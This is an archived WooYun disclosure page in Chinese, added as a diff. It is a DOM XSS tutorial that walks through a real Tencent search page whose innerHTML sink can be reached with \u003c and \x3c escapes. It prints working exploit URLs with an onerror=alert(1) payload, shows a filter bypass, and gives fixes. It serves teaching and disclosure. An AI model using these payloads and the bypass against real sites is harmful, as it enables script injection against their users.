@@ -1,0 +1,407 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 8. Dom Xss入门 [显式输出]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 8. Dom Xss入门 [显式输出]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-14 22:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-06：	细节向普通白帽子公开<br/>
+									2013-01-16：	细节向实习白帽子公开<br/>
+									2013-01-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">反射型XSS部分，就到这里了。 接着我们进入Dom Xss的部分。 Dom Xss相比反射型XSS，脑袋需要多思考一层。 也就是说，我们关注的不仅是【输出】了什么，还要了解这个页面里，【javascript】拿这个【输出】干了什么。 为了循序渐进，本例讲到的是，【输出】直接在源代码可见的情况。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 在学习Dom Xss之前，先来补习点 html, js 的基础知识。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div id=&quot;a&quot;&gt;xxx&lt;/div&gt;<br />
+<br />
+&lt;script&gt;<br />
+  document.getElementById(&quot;a&quot;).innerHTML=&quot;yyyyyy&quot;;<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+解释如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/142120151caa63f2e9bfc24b2db1ec83485eeb59.jpg" target="_blank"><img src="../images/142120151caa63f2e9bfc24b2db1ec83485eeb59.jpg" alt="33.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 进一步，我们的 yyyyyy ，还可以是 HTML代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div id=&quot;a&quot;&gt;xxx&lt;/div&gt;<br />
+<br />
+&lt;script&gt;<br />
+  document.getElementById(&quot;a&quot;).innerHTML=&quot; &lt;img src=1&gt; &quot;;<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+效果如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1421260800043bdd759aca14993882b1b595af9a.jpg" target="_blank"><img src="../images/1421260800043bdd759aca14993882b1b595af9a.jpg" alt="34.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 再进一步， JS的字符串中的字符可以写为 unicode编码。<br />
+<br />
+<br />
+<br />
+譬如： &lt; 可以表示为 \u003c  , &gt; 可以表示为 \u003e<br />
+<br />
+<br />
+<br />
+不知道怎么转义的，可以使用gainover的工具。 <br />
+<br />
+<br />
+<br />
+工具地址：http://app.baidu.com/app/enter?appid=280383<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/142132360f331fca8e91a8b3f8feda590e01dd40.jpg" target="_blank"><img src="../images/142132360f331fca8e91a8b3f8feda590e01dd40.jpg" alt="35.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+也就是，我们上面的代码，可以进一步写为。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div id=&quot;a&quot;&gt;xxx&lt;/div&gt;<br />
+<br />
+&lt;script&gt;<br />
+  document.getElementById(&quot;a&quot;).innerHTML=&quot;\u003cimg src=1\u003e&quot;;<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 上面看起来废话好多，但是还是很重要的，这对于后面实例的讲解很重要。<br />
+<br />
+<br />
+<br />
+5. 我们来看看一个具体的实例，地址如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://datalib.ent.qq.com/cgi-bin/search?libid=1&amp;keyvalue=aaaaaaa&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+和前面反射型的一样，我们先看看输出。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/142146481234d69392741334b10fead53a33de61.jpg" target="_blank"><img src="../images/142146481234d69392741334b10fead53a33de61.jpg" alt="36.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+相关代码，我也贴出来。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;strong id=&quot;titleshow&quot;&gt;按职业1检索：aaaaaaa &lt;/strong&gt;&lt;/div&gt;<br />
+&lt;script&gt;<br />
+if(&quot;aaaaaaa&quot;==&quot;&quot;)<br />
+document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按地区检索：全部明星&quot;;<br />
+<br />
+if(&quot;职业1&quot;==&quot;职业1&quot;)<br />
+document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;<br />
+<br />
+if(&quot;职业1&quot;==&quot;职业2&quot;)<br />
+document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;<br />
+<br />
+if(&quot;职业1&quot;==&quot;职业3&quot;)<br />
+document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6. 一共有6处，有一处图上没显示,但是也没用处，这里不列出来了，看上面代码中的5处。我们已经知道，&lt;, &gt;, &quot; 都被过滤了， 用前面提到的某些技巧，似乎也无法直接XSS。那么该怎么办呢？<br />
+<br />
+<br />
+<br />
+7. 在看到本教程的1，2，3 部分后，聪明的你们不知道会不会想到些什么呢？<br />
+<br />
+对的，那就是这里出现了 innerHTML=&quot;[输出]&quot; 的情况。<br />
+<br />
+<br />
+<br />
+我们可以看到，上面代码中，实际上只有一句是运行了的。我们重点看它。<br />
+<br />
+<br />
+<br />
+</p><pre><code>if(&quot;职业1&quot;==&quot;职业1&quot;)<br />
+document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：[输出]&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+8. 这里 [输出] 最然过滤了 &lt;,  &gt; ，但是并没有过滤 \ 。这样一来，大家应该清楚，为什么上面要说到 &lt; 可以写为 \u003c 了吧。 就是为了应付这种情况。<br />
+<br />
+<br />
+<br />
+9. 因此，我们可以构造缺陷点的代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>if(&quot;职业1&quot;==&quot;职业1&quot;)<br />
+document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：\u003cimg src=1 onerror=alert(1)\u003e&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+经过运行后， titleshow 里的HTML就会变为 &lt;img src=1 onerror=alert(1)&gt; ，从而弹出1。<br />
+<br />
+<br />
+<br />
+对应的，我们的利用代码，可以写为如下，其中空格，我写为了\u0020<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://datalib.ent.qq.com/cgi-bin/search?libid=1&amp;keyvalue=\u003Cimg\u0020src=1\u0020onerror=alert(1)\u003e&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看看对应的源代码，悲催的事情出现了， \u003c 和 \u003e竟然被腾讯过滤了。。。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/142157583ebeea10923c9aaa6bfdd43fb6141c04.jpg" target="_blank"><img src="../images/142157583ebeea10923c9aaa6bfdd43fb6141c04.jpg" alt="37.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 别灰心，被过滤的原因，是因为 @Jannock 大牛在乌云报告过这个漏洞。<br />
+<br />
+<br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-011192">WooYun: 跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷）</a> <br />
+<br />
+<br />
+<br />
+11. 其实我们还应该注意到上面图片中，过滤的实际上是\u003c和\u003e，但是并没有过滤\u0020，这说明，腾讯只是针对性的过滤，并没有过滤 反斜线。<br />
+<br />
+<br />
+<br />
+12. 其实呢，在JS字符串里， &lt; 不光可以写为 \u003c，还可以写为 \x3c， &gt; 同样可以写为 \x3e。我们试试腾讯过滤了这个没有呢？<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://datalib.ent.qq.com/cgi-bin/search?libid=1&amp;keyvalue=\x3Cimg\u0020src=1\u0020onerror=alert(1)\x3e&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+对应源码，看来没过滤啊～～<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1422023352658760151b3745d0e44be6fd6afd4c.jpg" target="_blank"><img src="../images/1422023352658760151b3745d0e44be6fd6afd4c.jpg" alt="38.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+哎呀，这次总算弹出来了。见漏洞证明<br />
+<br />
+<br />
+<br />
+13. 最后总结下。本例中是 innerHTML的情况。<br />
+<br />
+<br />
+<br />
+实际上只要是与改变页面HTML内容相关的操作，都可能导致这种问题。<br />
+<br />
+<br />
+<br />
+这也是网上介绍dom xss时，也经常会提到的东西，<br />
+<br />
+<br />
+<br />
+比如<br />
+<br />
+document.getElementById(&quot;y&quot;).innerHTML=&quot;xxxxxxxxxx&quot;;<br />
+<br />
+document.write(&quot;xxxxxxxxxxxx&quot;);<br />
+<br />
+<br />
+<br />
+还有一些网站，使用了第三方的JS库，譬如jQuery时，会有<br />
+<br />
+<br />
+<br />
+$(&quot;#y&quot;).html(&quot;xxxxxxx&quot;);<br />
+<br />
+<br />
+<br />
+14. 当然最后，还需要提到一些需要注意的地方。<br />
+<br />
+<br />
+<br />
+aa.innerHTML=&quot;xxxxxxxxxxxx&quot;; <br />
+<br />
+<br />
+<br />
+这种情况下。xxxxx只能使用 &lt;img src=1 onerror=alert(1)&gt; 这种方式来触发JS。<br />
+<br />
+<br />
+<br />
+而不能以 &lt;script&gt;alert(1)&lt;/script&gt; 来触发，因为这种压根不会执行&lt;script&gt;..&lt;/script&gt;之间的内容。 IE下，可以使用 &lt;script defer&gt;alert(1)&lt;/script&gt;。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/14221052f2505365d88f9c0a922f368a499641db.jpg" target="_blank"><img src="../images/14221052f2505365d88f9c0a922f368a499641db.jpg" alt="39.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">此案例凸显出开发人员的意识不足问题。指哪修哪，浮于表面的修复没有任何意义。<br />
+<br />
+<br />
+<br />
+方法1. 输出时，过滤 \<br />
+<br />
+方法2. innerHTML=encodeHTML([输出]) </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016041" title="[腾讯实例教程] 那些年我们一起学XSS - 8. Dom Xss入门 [显式输出]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-17 15:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16041";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
